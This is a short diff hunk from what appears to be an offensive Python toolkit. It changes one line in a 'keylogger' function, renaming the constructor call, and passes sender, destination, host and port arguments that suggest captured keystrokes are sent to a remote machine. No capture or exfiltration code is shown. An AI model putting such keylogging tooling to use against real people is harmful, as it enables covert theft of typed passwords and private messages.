@@ -925,7 +925,7 @@ def keylogger(args):
 
         from lib.utilities.keylogger import keylogger
 
-        keyloggerObj = keylogger.Keylogger(interval=args.interval,
+        keyloggerObj = keylogger.keylogger(interval=args.interval,
                                            sender=args.sender,
                                            destination=args.destination,
                                            host=args.host, port=args.port,
